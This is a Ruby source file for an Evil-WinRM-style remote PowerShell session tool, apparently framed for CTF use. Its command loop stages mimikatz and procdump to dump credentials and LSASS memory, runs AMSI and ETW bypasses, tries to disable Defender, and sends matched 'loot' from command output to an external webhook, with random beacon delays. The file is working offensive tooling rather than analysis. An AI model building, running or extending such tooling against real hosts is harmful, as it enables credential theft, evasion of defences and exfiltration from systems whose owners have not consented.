# lib/evil_ctf/session.rb

require_relative 'shell_wrapper'
require_relative 'banner'
require_relative 'tools'
require_relative 'uploader'          # loads EvilCTF::Uploader
require_relative 'enums'
require 'readline'
require 'timeout'

module EvilCTF::Session
  # Alias for the uploader helper
  Uploader = EvilCTF::Uploader

  # ------------------------------------------------------------------
  # Main session loop & command handling
  # ------------------------------------------------------------------
  def self.run_session(session_options)
    orig_ip = session_options[:ip]
    host = session_options[:ip].match?(/:/) ? 'ipv6addr' : normalize_host(orig_ip)
    scheme = session_options[:ssl] ? 'https' : 'http'
    endpoint = "#{scheme}://#{host}:#{session_options[:port]}/wsman"
    session_options[:endpoint] = endpoint

    EvilCTF::ShellWrapper.socksify!(session_options[:proxy]) if session_options[:proxy]

    puts "[*] Testing connection to #{orig_ip} (using #{host} in endpoint)..."
    unless EvilCTF::ShellWrapper.test_connection(endpoint, session_options[:user], session_options[:password],
                                                hash: session_options[:hash], ssl: session_options[:ssl])
      puts "[-] Connection test failed for #{orig_ip}"
      return false
    end

    conn = EvilCTF::ShellWrapper.create_connection(endpoint, session_options[:user], session_options[:password],
                                                   hash: session_options[:hash], ssl: session_options[:ssl])
    shell = conn.shell(:powershell)
    logger = SessionLogger.new(session_options[:logfile])   # <-- defined below
    history = CommandHistory.new
    command_manager = EvilCTF::Tools::CommandManager.new

    # Setup PowerShell prompt and aliases
    shell.run(%q{
      function prompt {
        "PS $pwd> "
      }
      Set-Alias __exit__ Exit-PSSession
    })

    puts "[+] Connected to #{orig_ip}"
    EvilCTF::Banner.show_banner_with_flagscan(shell, session_options)
    setup_autocomplete(history)

    enum_cache = {}
    run_enumeration(shell, type: session_options[:enum], cache: enum_cache,
                   fresh: session_options[:fresh]) if session_options[:enum]

    puts "Type 'help' for commands, '__exit__' or 'exit' to quit, or !bash for local shell.\n\n"

    # Main loop flag
    should_exit = false
    
    loop do
      break if should_exit
      
      begin
        Timeout.timeout(1800) do
          prompt = shell.run('prompt').output
          input  = Readline.readline(prompt, true)
          
          # Handle EOF (Ctrl+D) explicitly 
          if input.nil?
            puts '[*] EOF detected - exiting session...'
            should_exit = true
            break
          end

          input = input.strip
          next if input.empty?

          # Exit commands - make sure these are checked first
          case input.downcase
          when 'exit', 'quit', '__exit__', 'q'
            puts '[*] Exiting session...'
            should_exit = true
            break
          end

          history.add(input)

          case input
          when /^help$/i
            puts "\nBuiltin commands:"
            puts '  help                 - This help'
            puts '  clear                - Clear screen'
            puts '  tools                - List tool registry'
            puts '  download_missing     - Download all missing tools into ./tools'
            puts '  dump_creds           - Stage mimikatz & dump logon passwords'
            puts '  lsass_dump           - Stage procdump & dump LSASS to ./loot'
            puts '  enum [type]          - Run enumeration preset'
            puts '  fileops              - File operations menu (upload/download/ZIP)'
            puts '  bypass-4msi          - Try AMSI bypass'
            puts '  bypass-etw           - Full ETW bypass'
            puts '  disable_defender     - Try disabling Defender real-time'
            puts '  history              - Show command history'
            puts '  history clear        - Clear history file'
            puts '  profile save <name>  - Save current options as profile'
            puts '  upload <local> <remote> - Upload file (original Evil-WinRM style)'
            puts '  download <remote> <local> - Download file (original Evil-WinRM style)'
            puts '  load_ps1 <local_ps1> - Upload and load PS1 script'
            puts '  invoke-binary <local_bin> [args] - Upload and execute binary'
            puts '  services             - List services'
            puts '  processes            - List processes'
            puts '  sysinfo              - System info'
            puts "  __exit__/exit/quit   - Exit this Evil-WinRM CTF session"
            puts '  !sh / !bash          - Spawn local shell'
            puts "\nMacros: #{command_manager.list_macros.join(', ')}"
            puts "Aliases: #{command_manager.list_aliases.join(', ')}"
            next
          when /^clear$/i
            system('clear || cls')
            next
          when /^tools$/i
            EvilCTF::Tools.list_available_tools
            next
          when /^download_missing$/i
            EvilCTF::Tools.download_missing_tools
            next
          when /^dump_creds$/i
            EvilCTF::Tools.safe_autostage('mimikatz', shell, session_options, logger)
            EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
            command_manager.expand_macro('dump_creds', shell,
                                        webhook: session_options[:webhook])
            next
          when /^lsass_dump$/i
            EvilCTF::Tools.safe_autostage('procdump', shell, session_options, logger)
            command_manager.expand_macro('lsass_dump', shell,
                                        webhook: session_options[:webhook])
            Uploader.download_file('C:\\Users\\Public\\lsass.dmp',
                                  "loot/lsass_#{session_options[:ip]}.dmp",
                                  shell)
            next
          when /^fileops$/i
            Uploader.file_operations_menu(shell)
            next
          when /^enum(?:\s+(\S+))?$/i
            t = Regexp.last_match(1) || 'basic'
            run_enumeration(shell, type: t, cache: enum_cache,
                            fresh: session_options[:fresh])
            next
          when /^disable_defender$/i
            EvilCTF::Tools.disable_defender(shell)
            next
          when /^history$/i
            history.show
            next
          when /^history\s+clear$/i
            history.clear
            puts '[+] History cleared'
            next
          when /^profile\s+save\s+(\S+)$/i
            name = Regexp.last_match(1)
            EvilCTF::Tools.save_config_profile(name, session_options)
            next
          when /^tool\s+(\w+)$/i
            key = Regexp.last_match(1)
            if key == 'all'
              puts "[*] Staging all tools..."
              EvilCTF::Tools::TOOL_REGISTRY.each_key do |tool_key|
                EvilCTF::Tools.safe_autostage(tool_key, shell, session_options, logger)
              end
            else
              EvilCTF::Tools.safe_autostage(key, shell, session_options, logger)
            end
            next
          when /^!bash$/i, /^!sh$/i
            puts '[*] Spawning local shell. Type "exit" to return.'
            system(ENV['SHELL'] || '/bin/bash')
            next
          end

          # Macro expansion
          if command_manager.expand_macro(input, shell,
                                         webhook: session_options[:webhook])
            next
          end

          # Normal command path
          cmd = command_manager.expand_alias(input)
          start = Time.now
          result = shell.run(cmd)
          elapsed = Time.now - start
          puts result.output
          matches = EvilCTF::Tools.grep_output(result.output)
          if matches.any?
            EvilCTF::Tools.save_loot(matches)
            EvilCTF::Tools.beacon_loot(session_options[:webhook], matches) if session_options[:webhook]
          end
          logger.log_command(cmd, result, elapsed,
                            '$PID', result.exitcode || 0)
          sleep(rand(30..90)) if session_options[:beacon]
        end
      rescue Timeout::Error
        puts "\n[!] Idle timeout — closing session"
        should_exit = true
        break
      rescue Interrupt
        puts "\n[!] Ctrl-C detected; exiting."
        should_exit = true
        break
      rescue => e
        puts "[!] Session error: #{e.message}"
        puts "[!] Continuing session..."
        # Don't break on general errors, let user continue
        next
      end
    end

    # Proper shell cleanup with error handling
    begin
      if shell && !shell.nil?
        shell.close rescue nil
      end
    rescue => e
      # Suppress cleanup errors to avoid spamming output
    ensure
      shell = nil
    end
    
    puts '[+] Session closed.'
    true
  end

  # ------------------------------------------------------------------
  # Helper utilities
  # ------------------------------------------------------------------
  def self.normalize_host(host)
    begin
      ip_addr = IPAddr.new(host.split('%').first)
      if ip_addr.ipv6?
        "[#{host.split('%')[0]}]"
      else
        host
      end
    rescue IPAddr::InvalidAddressError
      host
    end
  end

  def self.setup_autocomplete(history)
    Readline.completion_append_character = " "
    Readline.completion_proc = proc { |s| history.history.grep(/^#{Regexp.escape(s)}/) }
  end

  # Host parsing helpers (used for multi‑host support)
  def self.parse_hosts_file(hosts_file)
    hosts = []
    return hosts unless File.exist?(hosts_file)

    File.readlines(hosts_file).each do |line|
      line.strip!
      next if line.empty? || line.start_with?('#')

      parts = line.split(':')
      if parts.size >= 3
        host = {
          ip: parts[0],
          user: parts[1],
          password: parts[2] || '',
          hash: parts[3]
        }
        hosts << host
      else
        puts "[!] Invalid host line: #{line}"
      end
    end

    hosts
  end

  # ------------------------------------------------------------------
  # Logging helper
  # ------------------------------------------------------------------
  class SessionLogger
    def initialize(logfile = nil)
      @logfile = logfile
      @start = Time.now
      setup if @logfile
    end

    def setup
      FileUtils.mkdir_p(File.dirname(@logfile)) if @logfile && File.dirname(@logfile) != '.'
      File.open(@logfile, 'a') do |f|
        f.puts "=== Session started: #{@start} ==="
        f.puts
      end
    end

    def log_command(cmd, result, elapsed = nil, pid = nil, exit_code = nil)
      return unless @logfile

      File.open(@logfile, 'a') do |f|
        f.puts "[#{Time.now}] >> #{cmd}"
        f.puts result.output
        f.puts "[#{Time.now}] << Completed in #{elapsed&.round(2)}s | PID: #{pid} | Exit: #{exit_code}"
        f.puts
      end
    end
  end

  # ------------------------------------------------------------------
  # Command history helper
  # ------------------------------------------------------------------
  class CommandHistory
    def initialize
      @history = []
    end

    def add(cmd)
      @history << cmd
    end

    def show
      @history.each_with_index { |c, i| puts "#{i+1}: #{c}" }
    end

    def clear
      @history = []
    end

    def history
      @history
    end
  end

end
